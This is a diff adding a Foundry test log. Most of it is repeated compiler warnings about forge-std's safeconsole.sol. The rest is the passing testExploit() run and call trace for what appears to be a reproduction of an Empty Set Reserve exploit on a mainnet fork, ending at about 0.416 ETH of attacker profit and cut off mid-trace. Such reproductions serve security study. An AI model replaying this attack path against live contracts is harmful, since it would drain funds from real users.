+    --> lib/forge-std/src/safeconsole.sol:3573:9:
+     |
+3573 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3593:9:
+     |
+3593 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3608:9:
+     |
+3608 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3624:9:
+     |
+3624 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3639:9:
+     |
+3639 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3655:9:
+     |
+3655 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3670:9:
+     |
+3670 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3688:9:
+     |
+3688 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3713:9:
+     |
+3713 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3731:9:
+     |
+3731 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3746:9:
+     |
+3746 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3762:9:
+     |
+3762 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3777:9:
+     |
+3777 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3793:9:
+     |
+3793 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3808:9:
+     |
+3808 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3826:9:
+     |
+3826 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3851:9:
+     |
+3851 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3869:9:
+     |
+3869 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3884:9:
+     |
+3884 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3900:9:
+     |
+3900 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3915:9:
+     |
+3915 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3931:9:
+     |
+3931 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3946:9:
+     |
+3946 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3964:9:
+     |
+3964 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:3989:9:
+     |
+3989 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4009:9:
+     |
+4009 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4034:9:
+     |
+4034 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4054:9:
+     |
+4054 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4079:9:
+     |
+4079 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4099:9:
+     |
+4099 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4124:9:
+     |
+4124 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4146:9:
+     |
+4146 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4174:9:
+     |
+4174 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4194:9:
+     |
+4194 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4209:9:
+     |
+4209 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2424): Natspec memory-safe-assembly special comment for inline assembly is deprecated and scheduled for removal. Use the memory-safe block annotation instead.
+    --> lib/forge-std/src/safeconsole.sol:4225:9:
+     |
+4225 |         assembly {
+     |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/EmptySetReserve_exp.sol:ContractTest
+[PASS] testExploit() (gas: 2234541)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  Attacker After exploit ETH Balance: 0.416271181367327696
+
+Traces:
+  [33798] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 22988103 [2.298e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(EOA attacker: [0xdDEB9e72fbecCa668fFD47314565954347ade522], "EOA attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(trace attack contract: [0x17E2c0844AE7CfE9D0B04cA923017F4892824E15], "trace attack contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Empty Set Reserve proxy: [0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B], "Empty Set Reserve proxy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Empty Set Reserve implementation: [0x363aF3acFfEd0B7181C2E3c56C00922E142100a8], "Empty Set Reserve implementation")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DSU: [0x605D26FBd5be761089281d5cec2Ce86eeA667109], "DSU")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e], "ESS")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], "COMP")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2356441] ContractTest::testExploit()
+    ├─ [0] VM::deal(EOA attacker: [0xdDEB9e72fbecCa668fFD47314565954347ade522], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [12922] Empty Set Reserve proxy::fallback(COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e]) [staticcall]
+    │   ├─ [5684] Empty Set Reserve implementation::order(COMP: [0xc00e94Cb662C3520282E6f5717214004A7f26888], ESS: [0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e]) [delegatecall]
+    │   │   └─ ← [Return] 267010781166742363801758 [2.67e23], 41581642538295042665 [4.158e19]
+    │   └─ ← [Return] 267010781166742363801758 [2.67e23], 41581642538295042665 [4.158e19]
+    ├─ [0] VM::assertEq(267010781166742363801758 [2.67e23], 267010781166742363801758 [2.67e23], "unexpected COMP/ESS order price") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(41581642538295042665 [4.158e19], 41581642538295042665 [4.158e19], "unexpected COMP/ESS order amount") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1440697] → new EmptySetReserveAttack@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 7196 bytes of code
+    ├─ [827802] EmptySetReserveAttack::execute()
+    │   ├─ [768456] PoolManager::unlock(0x)
+    │   │   ├─ [766509] EmptySetReserveAttack::unlockCallback(0x)
+    │   │   │   ├─ [44740] PoolManager::take(USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000 [1e10])
+    │   │   │   │   ├─ [40652] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000 [1e10])
+    │   │   │   │   │   ├─ [33363] FiatTokenV2_2::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000 [1e10]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: PoolManager: [0x000000000004444c5dc75cB358380D2e3dE08A90], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10000000000 [1e10])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x3c2304a4bd8ffa93cccd3b8e4c28dbcd5c94236b1a7b40e3dc80ba6953b4cc7a: 0x0000000000000000000000000000000000000000000000000000469cfec10bca → 0x0000000000000000000000000000000000000000000000000000469aaab527ca
+    │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0 → 0x00000000000000000000000000000000000000000000000000000002540be400
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [25462] USDC::fallback(0xAEf566ca7E84d1E736f999765a804687f39D9094, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ [24673] FiatTokenV2_2::approve(0xAEf566ca7E84d1E736f999765a804687f39D9094, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0xAEf566ca7E84d1E736f999765a804687f39D9094, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x61220416ed5c043105fcaee794788717a30768db4570bf39135cb35e662554e4: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [49836] 0xAEf566ca7E84d1E736f999765a804687f39D9094::wrap(227550528462023058437 [2.275e20], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [11349] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xAEf566ca7E84d1E736f999765a804687f39D9094, 227550529 [2.275e8])
+    │   │   │   │   │   ├─ [10554] FiatTokenV2_2::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xAEf566ca7E84d1E736f999765a804687f39D9094, 227550529 [2.275e8]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xAEf566ca7E84d1E736f999765a804687f39D9094, value: 227550529 [2.275e8])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xec1fbd9f141fd18964d683e0efede12d9bad9ee057442a1065839a2f7996b492: 0x0000000000000000000000000000000000000000000000000000000015ee5bde → 0x00000000000000000000000000000000000000000000000000000000237e811f
+    │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x00000000000000000000000000000000000000000000000000000002540be400 → 0x00000000000000000000000000000000000000000000000000000002467bbebf
+    │   │   │   │   │   │   │   @ 0x61220416ed5c043105fcaee794788717a30768db4570bf39135cb35e662554e4: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff26fdabe
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [30551] DSU::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 227550528462023058437 [2.275e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xAEf566ca7E84d1E736f999765a804687f39D9094, to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 227550528462023058437 [2.275e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0 → 0x00000000000000000000000000000000000000000000000c55e5e005974c6405
+    │   │   │   │   │   │   @ 0xf575ec4fdedc71f8dd7e7af32f8381bea7841b877280185215b2a4395d57085e: 0x00000000000000000000000000000000000000000000d3ae2994a2a043ce91ae → 0x00000000000000000000000000000000000000000000d3a1d3aec29aac822da9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Wrap(param0: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 227550528462023058437 [2.275e20])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [25107] DSU::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf75c7f826b9fd9bdf8d98eff0427adccbd0c8b1590a5e54e32476f05582e6f5a: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [93312] UniswapV2Router02::swapExactTokensForTokens(227550528462023058437 [2.275e20], 0, [0x605D26FBd5be761089281d5cec2Ce86eeA667109, 0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1753349015 [1.753e9])
+    │   │   │   │   ├─ [2504] 0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 35289321128595908555564815 [3.528e25], 1179903075303829485556 [1.179e21], 1752986339 [1.752e9]
+    │   │   │   │   ├─ [9208] DSU::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159, 227550528462023058437 [2.275e20])
+    │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159, value: 227550528462023058437 [2.275e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x407b49835a0660cb9d08bcabbbc30a7b3e9142e82d009d6a63d932db9d6b3349: 0x00000000000000000000000000000000000000000000000c55e5e005974c6405 → 0
+    │   │   │   │   │   │   @ 0x529a3905c1f2ffc13c7d5b6ead4e74cb018f9df7f80d1fa035c22fb6e7793f33: 0x00000000000000000000000000000000000000000000003ff671cb982bbb37f4 → 0x00000000000000000000000000000000000000000000004c4c57ab9dc3079bf9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [71281] 0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159::swap(5691056776835804261793974 [5.691e24], 0, EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [35724] ESS::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 5691056776835804261793974 [5.691e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159, to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 5691056776835804261793974 [5.691e24])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000004b520ce59e514fe9440b6
+    │   │   │   │   │   │   │   @ 0xe82c214ff1a84c1d4775e32bb339687f56a4e57dba561a7c8db5e74a3b9e71a5: 0x0000000000000000000000000000000000000000001d30cdee81256e6309e70f → 0x000000000000000000000000000000000000000000187bad202740596475a659
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [876] ESS::balanceOf(0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 29598264351760104293770841 [2.959e25]
+    │   │   │   │   │   ├─ [858] DSU::balanceOf(0xcAdD30b39F01CfDFb848174b19Bbb5b1B7486159) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1407453603765852543993 [1.407e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 29598264351760104293770841 [2.959e25], reserve1: 1407453603765852543993 [1.407e21])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 227550528462023058437 [2.275e20], amount0Out: 5691056776835804261793974 [5.691e24], amount1Out: 0, to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x000000000000000000000000000000026a151655c685ea9526e2fa808c930fdc → 0x000000000000000000000000000000026a21369f25e181295804df985612b524
+    │   │   │   │   │   │   @ 8: 0x687c72e300000000003ff671cb982bbb37f40000001d30cdee81256e6309e70f → 0x6881fb9700000000004c4c57ab9dc3079bf9000000187bad202740596475a659
+    │   │   │   │   │   │   @ 10: 0x00000000000000000000000000b41e12755a62750664921908de68e4c7158178 → 0x00000000000000000000000000b6a49ce2e66ebd0ad4e9c7edf4c3bff2ba3534
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] [227550528462023058437 [2.275e20], 5691056776835804261793974 [5.691e24]]
+    │   │   │   ├─ [25462] USDC::fallback(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ [24673] FiatTokenV2_2::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x47d1cbba1df0481e28f5a25694f143bb6795d54d92921a0ff96c452a44100da9: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [81344] UniswapV2Router02::swapExactTokensForTokens(227550528 [2.275e8], 0, [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1753349015 [1.753e9])
+    │   │   │   │   ├─ [2504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14488581527149 [1.448e13], 3989024931026823528050 [3.989e21], 1753349015 [1.753e9]
+    │   │   │   │   ├─ [13349] USDC::fallback(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 227550528 [2.275e8])
+    │   │   │   │   │   ├─ [12554] FiatTokenV2_2::transferFrom(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], 227550528 [2.275e8]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], value: 227550528 [2.275e8])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x47d1cbba1df0481e28f5a25694f143bb6795d54d92921a0ff96c452a44100da9: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffff26fdabf
+    │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x00000000000000000000000000000000000000000000000000000002467bbebf → 0x0000000000000000000000000000000000000000000000000000000238eb997f
+    │   │   │   │   │   │   │   @ 0x28c0947f463362aab09a2d7896ccc847fb7e52633a16b978fb2caf3db1a9b8f8: 0x00000000000000000000000000000000000000000000000000000d2d62c1566d → 0x00000000000000000000000000000000000000000000000000000d2d70517bad
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [55242] UniswapV2Pair::swap(0, 62460734547587260 [6.246e16], EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [29962] WETH9::transfer(EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 62460734547587260 [6.246e16])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 62460734547587260 [6.246e16])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000000000000000000000000000000000000000000000000dde7b5071e70bc
+    │   │   │   │   │   │   │   @ 0xb374801ace2c02f5db0425ab5920a2b7ed1d5a00abbcd395fda7530ba1d666c0: 0x0000000000000000000000000000000000000000000000d83ed770024ee7be72 → 0x0000000000000000000000000000000000000000000000d83df9884d47c94db6
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1339] USDC::fallback(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 14488809077677 [1.448e13]
+    │   │   │   │   │   │   └─ ← [Return] 14488809077677 [1.448e13]
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3988962470292275940790 [3.988e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 14488809077677 [1.448e13], reserve1: 3988962470292275940790 [3.988e21])
+    │   │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 227550528 [2.275e8], amount1In: 0, amount0Out: 0, amount1Out: 62460734547587260 [6.246e16], to: EmptySetReserveAttack: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x6881fb970000000000d83ed770024ee7be7200000000000000000d2d62c1566d → 0x6881fb970000000000d83df9884d47c94db600000000000000000d2d70517bad
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] [227550528 [2.275e8], 62460734547587260 [6.246e16]]
